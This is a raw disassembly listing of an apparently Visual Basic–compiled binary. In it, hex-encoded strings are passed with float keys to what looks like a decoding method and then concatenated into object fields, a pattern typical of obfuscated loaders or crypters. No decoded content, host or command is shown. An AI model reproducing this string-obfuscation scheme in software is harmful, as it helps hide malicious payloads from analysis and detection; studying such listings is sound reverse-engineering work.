.text:00408995                 push    offset aQ34354e4750544 ; "q34354e475054474d"
.text:0040899A                 mov     eax, [ebp+8]
.text:0040899D                 mov     eax, [eax]
.text:0040899F                 push    dword ptr [ebp+8]
.text:004089A2                 call    dword ptr [eax+24h]
.text:004089A5                 mov     [ebp-2Ch], eax
.text:004089A8                 cmp     dword ptr [ebp-2Ch], 0
.text:004089AC                 jge     short loc_4089C5
.text:004089AE                 push    24h ; '$'
.text:004089B0                 push    offset dword_4027CC
.text:004089B5                 push    dword ptr [ebp+8]
.text:004089B8                 push    dword ptr [ebp-2Ch]
.text:004089BB                 call    __vbaHresultCheckObj
.text:004089C0                 mov     [ebp-54h], eax
.text:004089C3                 jmp     short loc_4089C9
.text:004089C5 ; ---------------------------------------------------------------------------
.text:004089C5
.text:004089C5 loc_4089C5:                             ; CODE XREF: .text:004089AC↑j
.text:004089C5                 and     dword ptr [ebp-54h], 0
.text:004089C9
.text:004089C9 loc_4089C9:                             ; CODE XREF: .text:004089C3↑j
.text:004089C9                 mov     edx, [ebp-18h]
.text:004089CC                 mov     ecx, [ebp+8]
.text:004089CF                 add     ecx, 58h ; 'X'
.text:004089D2                 call    __vbaStrCopy
.text:004089D7                 lea     ecx, [ebp-18h]
.text:004089DA                 call    __vbaFreeStr
.text:004089DF                 fld     ds:flt_401214
.text:004089E5                 fstp    dword ptr [ebp-20h]
.text:004089E8                 lea     eax, [ebp-18h]
.text:004089EB                 push    eax
.text:004089EC                 push    0
.text:004089EE                 lea     eax, [ebp-20h]
.text:004089F1                 push    eax
.text:004089F2                 push    offset aR91     ; "R91"
.text:004089F7                 mov     eax, [ebp+8]
.text:004089FA                 mov     eax, [eax]
.text:004089FC                 push    dword ptr [ebp+8]
.text:004089FF                 call    dword ptr [eax+24h]
.text:00408A02                 mov     [ebp-2Ch], eax
.text:00408A05                 cmp     dword ptr [ebp-2Ch], 0
.text:00408A09                 jge     short loc_408A22
.text:00408A0B                 push    24h ; '$'
.text:00408A0D                 push    offset dword_4027CC
.text:00408A12                 push    dword ptr [ebp+8]
.text:00408A15                 push    dword ptr [ebp-2Ch]
.text:00408A18                 call    __vbaHresultCheckObj
.text:00408A1D                 mov     [ebp-58h], eax
.text:00408A20                 jmp     short loc_408A26
.text:00408A22 ; ---------------------------------------------------------------------------
.text:00408A22
.text:00408A22 loc_408A22:                             ; CODE XREF: .text:00408A09↑j
.text:00408A22                 and     dword ptr [ebp-58h], 0
.text:00408A26
.text:00408A26 loc_408A26:                             ; CODE XREF: .text:00408A20↑j
.text:00408A26                 mov     eax, [ebp-18h]
.text:00408A29                 mov     [ebp-38h], eax
.text:00408A2C                 and     dword ptr [ebp-18h], 0
.text:00408A30                 mov     edx, [ebp-38h]
.text:00408A33                 lea     ecx, [ebp-1Ch]
.text:00408A36                 call    __vbaStrMove
.text:00408A3B                 lea     eax, [ebp-28h]
.text:00408A3E                 push    eax
.text:00408A3F                 lea     eax, [ebp-1Ch]
.text:00408A42                 push    eax
.text:00408A43                 mov     eax, [ebp+8]
.text:00408A46                 mov     eax, [eax]
.text:00408A48                 push    dword ptr [ebp+8]
.text:00408A4B                 call    dword ptr [eax+44h]
.text:00408A4E                 fld     qword ptr [ebp-28h]
.text:00408A51                 call    __vbaFpI2
.text:00408A56                 mov     ecx, [ebp+8]
.text:00408A59                 mov     [ecx+50h], ax
.text:00408A5D                 lea     ecx, [ebp-1Ch]
.text:00408A60                 call    __vbaFreeStr
.text:00408A65                 fld     ds:flt_401210
.text:00408A6B                 fstp    dword ptr [ebp-20h]
.text:00408A6E                 lea     eax, [ebp-18h]
.text:00408A71                 push    eax
.text:00408A72                 push    0
.text:00408A74                 lea     eax, [ebp-20h]
.text:00408A77                 push    eax
.text:00408A78                 push    offset aU51     ; "u51"
.text:00408A7D                 mov     eax, [ebp+8]
.text:00408A80                 mov     eax, [eax]
.text:00408A82                 push    dword ptr [ebp+8]
.text:00408A85                 call    dword ptr [eax+24h]
.text:00408A88                 mov     [ebp-2Ch], eax
.text:00408A8B                 cmp     dword ptr [ebp-2Ch], 0
.text:00408A8F                 jge     short loc_408AA8
.text:00408A91                 push    24h ; '$'
.text:00408A93                 push    offset dword_4027CC
.text:00408A98                 push    dword ptr [ebp+8]
.text:00408A9B                 push    dword ptr [ebp-2Ch]
.text:00408A9E                 call    __vbaHresultCheckObj
.text:00408AA3                 mov     [ebp-5Ch], eax
.text:00408AA6                 jmp     short loc_408AAC
.text:00408AA8 ; ---------------------------------------------------------------------------
.text:00408AA8
.text:00408AA8 loc_408AA8:                             ; CODE XREF: .text:00408A8F↑j
.text:00408AA8                 and     dword ptr [ebp-5Ch], 0
.text:00408AAC
.text:00408AAC loc_408AAC:                             ; CODE XREF: .text:00408AA6↑j
.text:00408AAC                 mov     eax, [ebp-18h]
.text:00408AAF                 mov     [ebp-3Ch], eax
.text:00408AB2                 and     dword ptr [ebp-18h], 0
.text:00408AB6                 mov     edx, [ebp-3Ch]
.text:00408AB9                 lea     ecx, [ebp-1Ch]
.text:00408ABC                 call    __vbaStrMove
.text:00408AC1                 lea     eax, [ebp-28h]
.text:00408AC4                 push    eax
.text:00408AC5                 lea     eax, [ebp-1Ch]
.text:00408AC8                 push    eax
.text:00408AC9                 mov     eax, [ebp+8]
.text:00408ACC                 mov     eax, [eax]
.text:00408ACE                 push    dword ptr [ebp+8]
.text:00408AD1                 call    dword ptr [eax+44h]
.text:00408AD4                 fld     qword ptr [ebp-28h]
.text:00408AD7                 call    __vbaFpI4
.text:00408ADC                 mov     ecx, [ebp+8]
.text:00408ADF                 mov     [ecx+6Ch], eax
.text:00408AE2                 lea     ecx, [ebp-1Ch]
.text:00408AE5                 call    __vbaFreeStr
.text:00408AEA                 fld     ds:flt_40120C
.text:00408AF0                 fstp    dword ptr [ebp-20h]
.text:00408AF3                 lea     eax, [ebp-18h]
.text:00408AF6                 push    eax
.text:00408AF7                 push    0
.text:00408AF9                 lea     eax, [ebp-20h]
.text:00408AFC                 push    eax
.text:00408AFD                 push    offset aP8f     ; "P8f"
.text:00408B02                 mov     eax, [ebp+8]
.text:00408B05                 mov     eax, [eax]
.text:00408B07                 push    dword ptr [ebp+8]
.text:00408B0A                 call    dword ptr [eax+24h]
.text:00408B0D                 mov     [ebp-2Ch], eax
.text:00408B10                 cmp     dword ptr [ebp-2Ch], 0
.text:00408B14                 jge     short loc_408B2D
.text:00408B16                 push    24h ; '$'
.text:00408B18                 push    offset dword_4027CC
.text:00408B1D                 push    dword ptr [ebp+8]
.text:00408B20                 push    dword ptr [ebp-2Ch]
.text:00408B23                 call    __vbaHresultCheckObj
.text:00408B28                 mov     [ebp-60h], eax
.text:00408B2B                 jmp     short loc_408B31
.text:00408B2D ; ---------------------------------------------------------------------------
.text:00408B2D
.text:00408B2D loc_408B2D:                             ; CODE XREF: .text:00408B14↑j
.text:00408B2D                 and     dword ptr [ebp-60h], 0
.text:00408B31
.text:00408B31 loc_408B31:                             ; CODE XREF: .text:00408B2B↑j
.text:00408B31                 mov     eax, [ebp-18h]
.text:00408B34                 mov     [ebp-40h], eax
.text:00408B37                 and     dword ptr [ebp-18h], 0
.text:00408B3B                 mov     edx, [ebp-40h]
.text:00408B3E                 lea     ecx, [ebp-1Ch]
.text:00408B41                 call    __vbaStrMove
.text:00408B46                 lea     eax, [ebp-28h]
.text:00408B49                 push    eax
.text:00408B4A                 lea     eax, [ebp-1Ch]
.text:00408B4D                 push    eax
.text:00408B4E                 mov     eax, [ebp+8]
.text:00408B51                 mov     eax, [eax]
.text:00408B53                 push    dword ptr [ebp+8]
.text:00408B56                 call    dword ptr [eax+44h]
.text:00408B59                 fld     qword ptr [ebp-28h]
.text:00408B5C                 call    __vbaFpI4
.text:00408B61                 mov     ecx, [ebp+8]
.text:00408B64                 mov     [ecx+78h], eax
.text:00408B67                 lea     ecx, [ebp-1Ch]
.text:00408B6A                 call    __vbaFreeStr
.text:00408B6F                 fld     ds:flt_401208
.text:00408B75                 fstp    dword ptr [ebp-20h]
.text:00408B78                 lea     eax, [ebp-18h]
.text:00408B7B                 push    eax
.text:00408B7C                 push    0
.text:00408B7E                 lea     eax, [ebp-20h]
.text:00408B81                 push    eax
.text:00408B82                 push    offset aJ90     ; "j90"
.text:00408B87                 mov     eax, [ebp+8]
.text:00408B8A                 mov     eax, [eax]
.text:00408B8C                 push    dword ptr [ebp+8]
.text:00408B8F                 call    dword ptr [eax+24h]
.text:00408B92                 mov     [ebp-2Ch], eax
.text:00408B95                 cmp     dword ptr [ebp-2Ch], 0
.text:00408B99                 jge     short loc_408BB2
.text:00408B9B                 push    24h ; '$'
.text:00408B9D                 push    offset dword_4027CC
.text:00408BA2                 push    dword ptr [ebp+8]
.text:00408BA5                 push    dword ptr [ebp-2Ch]
.text:00408BA8                 call    __vbaHresultCheckObj
.text:00408BAD                 mov     [ebp-64h], eax
.text:00408BB0                 jmp     short loc_408BB6
.text:00408BB2 ; ---------------------------------------------------------------------------
.text:00408BB2
.text:00408BB2 loc_408BB2:                             ; CODE XREF: .text:00408B99↑j
.text:00408BB2                 and     dword ptr [ebp-64h], 0
.text:00408BB6
.text:00408BB6 loc_408BB6:                             ; CODE XREF: .text:00408BB0↑j
.text:00408BB6                 mov     eax, [ebp-18h]
.text:00408BB9                 mov     [ebp-44h], eax
.text:00408BBC                 and     dword ptr [ebp-18h], 0
.text:00408BC0                 mov     edx, [ebp-44h]
.text:00408BC3                 lea     ecx, [ebp-1Ch]
.text:00408BC6                 call    __vbaStrMove
.text:00408BCB                 lea     eax, [ebp-28h]
.text:00408BCE                 push    eax
.text:00408BCF                 lea     eax, [ebp-1Ch]
.text:00408BD2                 push    eax
.text:00408BD3                 mov     eax, [ebp+8]
.text:00408BD6                 mov     eax, [eax]
.text:00408BD8                 push    dword ptr [ebp+8]
.text:00408BDB                 call    dword ptr [eax+44h]
.text:00408BDE                 fld     qword ptr [ebp-28h]
.text:00408BE1                 call    __vbaFpI4
.text:00408BE6                 mov     ecx, [ebp+8]
.text:00408BE9                 mov     [ecx+60h], eax
.text:00408BEC                 lea     ecx, [ebp-1Ch]
.text:00408BEF                 call    __vbaFreeStr
.text:00408BF4                 fld     ds:flt_401204
.text:00408BFA                 fstp    dword ptr [ebp-20h]
.text:00408BFD                 lea     eax, [ebp-18h]
.text:00408C00                 push    eax
.text:00408C01                 push    0
.text:00408C03                 lea     eax, [ebp-20h]
.text:00408C06                 push    eax
.text:00408C07                 push    offset aG48     ; "g48"
.text:00408C0C                 mov     eax, [ebp+8]
.text:00408C0F                 mov     eax, [eax]
.text:00408C11                 push    dword ptr [ebp+8]
.text:00408C14                 call    dword ptr [eax+24h]
.text:00408C17                 mov     [ebp-2Ch], eax
.text:00408C1A                 cmp     dword ptr [ebp-2Ch], 0
.text:00408C1E                 jge     short loc_408C37
.text:00408C20                 push    24h ; '$'
.text:00408C22                 push    offset dword_4027CC
.text:00408C27                 push    dword ptr [ebp+8]
.text:00408C2A                 push    dword ptr [ebp-2Ch]
.text:00408C2D                 call    __vbaHresultCheckObj
.text:00408C32                 mov     [ebp-68h], eax
.text:00408C35                 jmp     short loc_408C3B
.text:00408C37 ; ---------------------------------------------------------------------------
.text:00408C37
.text:00408C37 loc_408C37:                             ; CODE XREF: .text:00408C1E↑j
.text:00408C37                 and     dword ptr [ebp-68h], 0
.text:00408C3B
.text:00408C3B loc_408C3B:                             ; CODE XREF: .text:00408C35↑j
.text:00408C3B                 mov     eax, [ebp-18h]
.text:00408C3E                 mov     [ebp-48h], eax
.text:00408C41                 and     dword ptr [ebp-18h], 0
.text:00408C45                 mov     edx, [ebp-48h]
.text:00408C48                 lea     ecx, [ebp-1Ch]
.text:00408C4B                 call    __vbaStrMove
.text:00408C50                 lea     eax, [ebp-28h]
.text:00408C53                 push    eax
.text:00408C54                 lea     eax, [ebp-1Ch]
.text:00408C57                 push    eax
.text:00408C58                 mov     eax, [ebp+8]
.text:00408C5B                 mov     eax, [eax]
.text:00408C5D                 push    dword ptr [ebp+8]
.text:00408C60                 call    dword ptr [eax+44h]
.text:00408C63                 fld     qword ptr [ebp-28h]
.text:00408C66                 call    __vbaFpI4
.text:00408C6B                 mov     ecx, [ebp+8]
.text:00408C6E                 mov     [ecx+5Ch], eax
.text:00408C71                 lea     ecx, [ebp-1Ch]
.text:00408C74                 call    __vbaFreeStr
.text:00408C79                 fld     ds:flt_401200
.text:00408C7F                 fstp    dword ptr [ebp-20h]
.text:00408C82                 lea     eax, [ebp-18h]
.text:00408C85                 push    eax
.text:00408C86                 push    0
.text:00408C88                 lea     eax, [ebp-20h]
.text:00408C8B                 push    eax
.text:00408C8C                 push    offset aI93a1b6a58fa1a ; "I93a1b6a58fa1a8a582a0a1afafa1aeaca9ab7f"...
.text:00408C91                 mov     eax, [ebp+8]
.text:00408C94                 mov     eax, [eax]
.text:00408C96                 push    dword ptr [ebp+8]
.text:00408C99                 call    dword ptr [eax+24h]
.text:00408C9C                 mov     [ebp-2Ch], eax
.text:00408C9F                 cmp     dword ptr [ebp-2Ch], 0
.text:00408CA3                 jge     short loc_408CBC
.text:00408CA5                 push    24h ; '$'
.text:00408CA7                 push    offset dword_4027CC
.text:00408CAC                 push    dword ptr [ebp+8]
.text:00408CAF                 push    dword ptr [ebp-2Ch]
.text:00408CB2                 call    __vbaHresultCheckObj
.text:00408CB7                 mov     [ebp-6Ch], eax
.text:00408CBA                 jmp     short loc_408CC0
.text:00408CBC ; ---------------------------------------------------------------------------
.text:00408CBC
.text:00408CBC loc_408CBC:                             ; CODE XREF: .text:00408CA3↑j
.text:00408CBC                 and     dword ptr [ebp-6Ch], 0
.text:00408CC0
.text:00408CC0 loc_408CC0:                             ; CODE XREF: .text:00408CBA↑j
.text:00408CC0                 mov     edx, [ebp-18h]
.text:00408CC3                 mov     ecx, [ebp+8]
.text:00408CC6                 add     ecx, 68h ; 'h'
.text:00408CC9                 call    __vbaStrCopy
.text:00408CCE                 lea     ecx, [ebp-18h]
.text:00408CD1                 call    __vbaFreeStr
.text:00408CD6                 fld     ds:flt_4011FC
.text:00408CDC                 fstp    dword ptr [ebp-20h]
.text:00408CDF                 lea     eax, [ebp-18h]
.text:00408CE2                 push    eax
.text:00408CE3                 push    0
.text:00408CE5                 lea     eax, [ebp-20h]
.text:00408CE8                 push    eax
.text:00408CE9                 push    offset aN9083918790948 ; "N908391879094807f8786847f83849187928284"...
.text:00408CEE                 mov     eax, [ebp+8]
.text:00408CF1                 mov     eax, [eax]
.text:00408CF3                 push    dword ptr [ebp+8]
.text:00408CF6                 call    dword ptr [eax+24h]
.text:00408CF9                 mov     [ebp-2Ch], eax
.text:00408CFC                 cmp     dword ptr [ebp-2Ch], 0
.text:00408D00                 jge     short loc_408D19
.text:00408D02                 push    24h ; '$'
.text:00408D04                 push    offset dword_4027CC
.text:00408D09                 push    dword ptr [ebp+8]
.text:00408D0C                 push    dword ptr [ebp-2Ch]
.text:00408D0F                 call    __vbaHresultCheckObj
.text:00408D14                 mov     [ebp-70h], eax
.text:00408D17                 jmp     short loc_408D1D
.text:00408D19 ; ---------------------------------------------------------------------------
.text:00408D19
.text:00408D19 loc_408D19:                             ; CODE XREF: .text:00408D00↑j
.text:00408D19                 and     dword ptr [ebp-70h], 0
.text:00408D1D
.text:00408D1D loc_408D1D:                             ; CODE XREF: .text:00408D17↑j
.text:00408D1D                 mov     edx, [ebp-18h]
.text:00408D20                 mov     ecx, [ebp+8]
.text:00408D23                 add     ecx, 74h ; 't'
.text:00408D26                 call    __vbaStrCopy
.text:00408D2B                 lea     ecx, [ebp-18h]
.text:00408D2E                 call    __vbaFreeStr
.text:00408D33                 fld     ds:flt_4011F8
.text:00408D39                 fstp    dword ptr [ebp-20h]
.text:00408D3C                 lea     eax, [ebp-18h]
.text:00408D3F                 push    eax
.text:00408D40                 push    0
.text:00408D42                 lea     eax, [ebp-20h]
.text:00408D45                 push    eax
.text:00408D46                 push    offset aS3d3c4f3d4d414 ; "S3d3c4f3d4d414e444e404f3c4e4442424e513d"...
.text:00408D4B                 mov     eax, [ebp+8]
.text:00408D4E                 mov     eax, [eax]
.text:00408D50                 push    dword ptr [ebp+8]
.text:00408D53                 call    dword ptr [eax+24h]
.text:00408D56                 mov     [ebp-2Ch], eax
.text:00408D59                 cmp     dword ptr [ebp-2Ch], 0
.text:00408D5D                 jge     short loc_408D76
.text:00408D5F                 push    24h ; '$'
.text:00408D61                 push    offset dword_4027CC
.text:00408D66                 push    dword ptr [ebp+8]
.text:00408D69                 push    dword ptr [ebp-2Ch]
.text:00408D6C                 call    __vbaHresultCheckObj
.text:00408D71                 mov     [ebp-74h], eax
.text:00408D74                 jmp     short loc_408D7A
.text:00408D76 ; ---------------------------------------------------------------------------
.text:00408D76
.text:00408D76 loc_408D76:                             ; CODE XREF: .text:00408D5D↑j
.text:00408D76                 and     dword ptr [ebp-74h], 0
.text:00408D7A
.text:00408D7A loc_408D7A:                             ; CODE XREF: .text:00408D74↑j
.text:00408D7A                 mov     eax, [ebp+8]
.text:00408D7D                 push    dword ptr [eax+74h]
.text:00408D80                 push    dword ptr [ebp-18h]
.text:00408D83                 call    __vbaStrCat
.text:00408D88                 mov     edx, eax
.text:00408D8A                 lea     ecx, [ebp-1Ch]
.text:00408D8D                 call    __vbaStrMove
.text:00408D92                 mov     edx, eax
.text:00408D94                 mov     ecx, [ebp+8]
.text:00408D97                 add     ecx, 74h ; 't'
.text:00408D9A                 call    __vbaStrCopy
.text:00408D9F                 lea     eax, [ebp-1Ch]
.text:00408DA2                 push    eax
.text:00408DA3                 lea     eax, [ebp-18h]
.text:00408DA6                 push    eax
.text:00408DA7                 push    2
.text:00408DA9                 call    __vbaFreeStrList
.text:00408DAE                 add     esp, 0Ch
.text:00408DB1                 fld     ds:flt_4011F4
.text:00408DB7                 fstp    dword ptr [ebp-20h]
.text:00408DBA                 lea     eax, [ebp-18h]
.text:00408DBD                 push    eax
.text:00408DBE                 push    0
.text:00408DC0                 lea     eax, [ebp-20h]
.text:00408DC3                 push    eax
.text:00408DC4                 push    offset aS7e7d7779797c7 ; "S7e7d7779797c75757d8b787d8b8b8b8b8b8b7a"...
.text:00408DC9                 mov     eax, [ebp+8]
.text:00408DCC                 mov     eax, [eax]
.text:00408DCE                 push    dword ptr [ebp+8]
.text:00408DD1                 call    dword ptr [eax+24h]
.text:00408DD4                 mov     [ebp-2Ch], eax
.text:00408DD7                 cmp     dword ptr [ebp-2Ch], 0
.text:00408DDB                 jge     short loc_408DF4
.text:00408DDD                 push    24h ; '$'
.text:00408DDF                 push    offset dword_4027CC
.text:00408DE4                 push    dword ptr [ebp+8]
.text:00408DE7                 push    dword ptr [ebp-2Ch]
.text:00408DEA                 call    __vbaHresultCheckObj
.text:00408DEF                 mov     [ebp-78h], eax
.text:00408DF2                 jmp     short loc_408DF8
.text:00408DF4 ; ---------------------------------------------------------------------------
.text:00408DF4
.text:00408DF4 loc_408DF4:                             ; CODE XREF: .text:00408DDB↑j
.text:00408DF4                 and     dword ptr [ebp-78h], 0
.text:00408DF8
.text:00408DF8 loc_408DF8:                             ; CODE XREF: .text:00408DF2↑j
.text:00408DF8                 mov     eax, [ebp+8]
.text:00408DFB                 push    dword ptr [eax+74h]
.text:00408DFE                 push    dword ptr [ebp-18h]
.text:00408E01                 call    __vbaStrCat
.text:00408E06                 mov     edx, eax
.text:00408E08                 lea     ecx, [ebp-1Ch]
.text:00408E0B                 call    __vbaStrMove
.text:00408E10                 mov     edx, eax
.text:00408E12                 mov     ecx, [ebp+8]
.text:00408E15                 add     ecx, 74h ; 't'
.text:00408E18                 call    __vbaStrCopy
.text:00408E1D                 lea     eax, [ebp-1Ch]
.text:00408E20                 push    eax
.text:00408E21                 lea     eax, [ebp-18h]
.text:00408E24                 push    eax
.text:00408E25                 push    2
.text:00408E27                 call    __vbaFreeStrList
.text:00408E2C                 add     esp, 0Ch
.text:00408E2F                 fld     ds:flt_4011F0
.text:00408E35                 fstp    dword ptr [ebp-20h]
.text:00408E38                 lea     eax, [ebp-18h]
.text:00408E3B                 push    eax
.text:00408E3C                 push    0
.text:00408E3E                 lea     eax, [ebp-20h]
.text:00408E41                 push    eax
.text:00408E42                 push    offset aL6b5a5e615a5a6 ; "L6b5a5e615a5a6c705d625a5b6e5f6c625e5b5f"...
.text:00408E47                 mov     eax, [ebp+8]
.text:00408E4A                 mov     eax, [eax]
.text:00408E4C                 push    dword ptr [ebp+8]
.text:00408E4F                 call    dword ptr [eax+24h]
.text:00408E52                 mov     [ebp-2Ch], eax
.text:00408E55                 cmp     dword ptr [ebp-2Ch], 0
.text:00408E59                 jge     short loc_408E72
.text:00408E5B                 push    24h ; '$'
.text:00408E5D                 push    offset dword_4027CC
.text:00408E62                 push    dword ptr [ebp+8]
.text:00408E65                 push    dword ptr [ebp-2Ch]
.text:00408E68                 call    __vbaHresultCheckObj
.text:00408E6D                 mov     [ebp-7Ch], eax
.text:00408E70                 jmp     short loc_408E76
.text:00408E72 ; ---------------------------------------------------------------------------
.text:00408E72
.text:00408E72 loc_408E72:                             ; CODE XREF: .text:00408E59↑j
.text:00408E72                 and     dword ptr [ebp-7Ch], 0
.text:00408E76
.text:00408E76 loc_408E76:                             ; CODE XREF: .text:00408E70↑j
.text:00408E76                 mov     eax, [ebp+8]
.text:00408E79                 push    dword ptr [eax+74h]
.text:00408E7C                 push    dword ptr [ebp-18h]
.text:00408E7F                 call    __vbaStrCat
.text:00408E84                 mov     edx, eax
.text:00408E86                 lea     ecx, [ebp-1Ch]
.text:00408E89                 call    __vbaStrMove
.text:00408E8E                 mov     edx, eax
.text:00408E90                 mov     ecx, [ebp+8]
.text:00408E93                 add     ecx, 74h ; 't'
.text:00408E96                 call    __vbaStrCopy
.text:00408E9B                 lea     eax, [ebp-1Ch]
.text:00408E9E                 push    eax
.text:00408E9F                 lea     eax, [ebp-18h]
.text:00408EA2                 push    eax
.text:00408EA3                 push    2
.text:00408EA5                 call    __vbaFreeStrList
.text:00408EAA                 add     esp, 0Ch
.text:00408EAD                 fld     ds:flt_4011EC
.text:00408EB3                 fstp    dword ptr [ebp-20h]
.text:00408EB6                 lea     eax, [ebp-18h]
.text:00408EB9                 push    eax
.text:00408EBA                 push    0
.text:00408EBC                 lea     eax, [ebp-20h]
.text:00408EBF                 push    eax
.text:00408EC0                 push    offset aP8486867186758 ; "p84868671867586798478857184878282878787"...
.text:00408EC5                 mov     eax, [ebp+8]
.text:00408EC8                 mov     eax, [eax]
.text:00408ECA                 push    dword ptr [ebp+8]
.text:00408ECD                 call    dword ptr [eax+24h]
.text:00408ED0                 mov     [ebp-2Ch], eax
.text:00408ED3                 cmp     dword ptr [ebp-2Ch], 0
.text:00408ED7                 jge     short loc_408EF0
.text:00408ED9                 push    24h ; '$'
.text:00408EDB                 push    offset dword_4027CC
.text:00408EE0                 push    dword ptr [ebp+8]
.text:00408EE3                 push    dword ptr [ebp-2Ch]
.text:00408EE6                 call    __vbaHresultCheckObj
.text:00408EEB                 mov     [ebp-80h], eax
.text:00408EEE                 jmp     short loc_408EF4
.text:00408EF0 ; ---------------------------------------------------------------------------
.text:00408EF0
.text:00408EF0 loc_408EF0:                             ; CODE XREF: .text:00408ED7↑j
.text:00408EF0                 and     dword ptr [ebp-80h], 0
.text:00408EF4
.text:00408EF4 loc_408EF4:                             ; CODE XREF: .text:00408EEE↑j
.text:00408EF4                 mov     eax, [ebp+8]
.text:00408EF7                 push    dword ptr [eax+74h]
.text:00408EFA                 push    dword ptr [ebp-18h]
.text:00408EFD                 call    __vbaStrCat
.text:00408F02                 mov     edx, eax
.text:00408F04                 lea     ecx, [ebp-1Ch]
.text:00408F07                 call    __vbaStrMove
.text:00408F0C                 mov     edx, eax
.text:00408F0E                 mov     ecx, [ebp+8]
.text:00408F11                 add     ecx, 74h ; 't'
.text:00408F14                 call    __vbaStrCopy
.text:00408F19                 lea     eax, [ebp-1Ch]
.text:00408F1C                 push    eax
.text:00408F1D                 lea     eax, [ebp-18h]
.text:00408F20                 push    eax
.text:00408F21                 push    2
.text:00408F23                 call    __vbaFreeStrList
.text:00408F28                 add     esp, 0Ch
.text:00408F2B                 fld     ds:flt_4011E8
.text:00408F31                 fstp    dword ptr [ebp-20h]
.text:00408F34                 lea     eax, [ebp-18h]
.text:00408F37                 push    eax
.text:00408F38                 push    0
.text:00408F3A                 lea     eax, [ebp-20h]
.text:00408F3D                 push    eax
.text:00408F3E                 push    offset aW3333333333333 ; "w33333333333333333333333333333333333333"...
.text:00408F43                 mov     eax, [ebp+8]
.text:00408F46                 mov     eax, [eax]
.text:00408F48                 push    dword ptr [ebp+8]
.text:00408F4B                 call    dword ptr [eax+24h]
.text:00408F4E                 mov     [ebp-2Ch], eax
.text:00408F51                 cmp     dword ptr [ebp-2Ch], 0
.text:00408F55                 jge     short loc_408F71
.text:00408F57                 push    24h ; '$'
.text:00408F59                 push    offset dword_4027CC
.text:00408F5E                 push    dword ptr [ebp+8]
.text:00408F61                 push    dword ptr [ebp-2Ch]
.text:00408F64                 call    __vbaHresultCheckObj
.text:00408F69                 mov     [ebp-84h], eax
.text:00408F6F                 jmp     short loc_408F78
.text:00408F71 ; ---------------------------------------------------------------------------
.text:00408F71
.text:00408F71 loc_408F71:                             ; CODE XREF: .text:00408F55↑j
.text:00408F71                 and     dword ptr [ebp-84h], 0
.text:00408F78
.text:00408F78 loc_408F78:                             ; CODE XREF: .text:00408F6F↑j
.text:00408F78                 mov     edx, [ebp-18h]
.text:00408F7B                 mov     ecx, [ebp+8]
.text:00408F7E                 add     ecx, 7Ch ; '|'
.text:00408F81                 call    __vbaStrCopy
.text:00408F86                 lea     ecx, [ebp-18h]
.text:00408F89                 call    __vbaFreeStr
.text:00408F8E                 fld     ds:flt_40120C
.text:00408F94                 fstp    dword ptr [ebp-20h]
.text:00408F97                 lea     eax, [ebp-18h]
.text:00408F9A                 push    eax
.text:00408F9B                 push    0
.text:00408F9D                 lea     eax, [ebp-20h]
.text:00408FA0                 push    eax
.text:00408FA1                 push    offset aV8d8d9594948e9 ; "v8d8d9594948e908e90919e948c8c8c8c8f8c9e"...
.text:00408FA6                 mov     eax, [ebp+8]
.text:00408FA9                 mov     eax, [eax]
.text:00408FAB                 push    dword ptr [ebp+8]
.text:00408FAE                 call    dword ptr [eax+24h]
.text:00408FB1                 mov     [ebp-2Ch], eax
.text:00408FB4                 cmp     dword ptr [ebp-2Ch], 0
.text:00408FB8                 jge     short loc_408FD4
.text:00408FBA                 push    24h ; '$'
.text:00408FBC                 push    offset dword_4027CC
.text:00408FC1                 push    dword ptr [ebp+8]
.text:00408FC4                 push    dword ptr [ebp-2Ch]
.text:00408FC7                 call    __vbaHresultCheckObj
.text:00408FCC                 mov     [ebp-88h], eax
.text:00408FD2                 jmp     short loc_408FDB
.text:00408FD4 ; ---------------------------------------------------------------------------
.text:00408FD4
.text:00408FD4 loc_408FD4:                             ; CODE XREF: .text:00408FB8↑j
.text:00408FD4                 and     dword ptr [ebp-88h], 0
.text:00408FDB
.text:00408FDB loc_408FDB:                             ; CODE XREF: .text:00408FD2↑j
.text:00408FDB                 mov     eax, [ebp+8]
.text:00408FDE                 push    dword ptr [eax+7Ch]
.text:00408FE1                 push    dword ptr [ebp-18h]
.text:00408FE4                 call    __vbaStrCat
.text:00408FE9                 mov     edx, eax
.text:00408FEB                 lea     ecx, [ebp-1Ch]
.text:00408FEE                 call    __vbaStrMove
.text:00408FF3                 mov     edx, eax
.text:00408FF5                 mov     ecx, [ebp+8]
.text:00408FF8                 add     ecx, 7Ch ; '|'
.text:00408FFB                 call    __vbaStrCopy
.text:00409000                 lea     eax, [ebp-1Ch]
.text:00409003                 push    eax
.text:00409004                 lea     eax, [ebp-18h]
.text:00409007                 push    eax
.text:00409008                 push    2
.text:0040900A                 call    __vbaFreeStrList
.text:0040900F                 add     esp, 0Ch
.text:00409012                 fld     ds:flt_4011E4
.text:00409018                 fstp    dword ptr [ebp-20h]
.text:0040901B                 lea     eax, [ebp-18h]
.text:0040901E                 push    eax
.text:0040901F                 push    0
.text:00409021                 lea     eax, [ebp-20h]
.text:00409024                 push    eax
.text:00409025                 push    offset a79767e7e7e8b7a ; "}79767e7e7e8b7a78877c7c78877c7676767679"...
.text:0040902A                 mov     eax, [ebp+8]
.text:0040902D                 mov     eax, [eax]
.text:0040902F                 push    dword ptr [ebp+8]
.text:00409032                 call    dword ptr [eax+24h]
.text:00409035                 mov     [ebp-2Ch], eax
.text:00409038                 cmp     dword ptr [ebp-2Ch], 0
.text:0040903C                 jge     short loc_409058
.text:0040903E                 push    24h ; '$'
.text:00409040                 push    offset dword_4027CC
.text:00409045                 push    dword ptr [ebp+8]
.text:00409048                 push    dword ptr [ebp-2Ch]
.text:0040904B                 call    __vbaHresultCheckObj
.text:00409050                 mov     [ebp-8Ch], eax
.text:00409056                 jmp     short loc_40905F
.text:00409058 ; ---------------------------------------------------------------------------
.text:00409058
.text:00409058 loc_409058:                             ; CODE XREF: .text:0040903C↑j
.text:00409058                 and     dword ptr [ebp-8Ch], 0
.text:0040905F
.text:0040905F loc_40905F:                             ; CODE XREF: .text:00409056↑j
.text:0040905F                 mov     eax, [ebp+8]
.text:00409062                 push    dword ptr [eax+7Ch]
.text:00409065                 push    dword ptr [ebp-18h]
.text:00409068                 call    __vbaStrCat
.text:0040906D                 mov     edx, eax
.text:0040906F                 lea     ecx, [ebp-1Ch]
.text:00409072                 call    __vbaStrMove
.text:00409077                 mov     edx, eax
.text:00409079                 mov     ecx, [ebp+8]
.text:0040907C                 add     ecx, 7Ch ; '|'
.text:0040907F                 call    __vbaStrCopy
.text:00409084                 lea     eax, [ebp-1Ch]
.text:00409087                 push    eax
.text:00409088                 lea     eax, [ebp-18h]
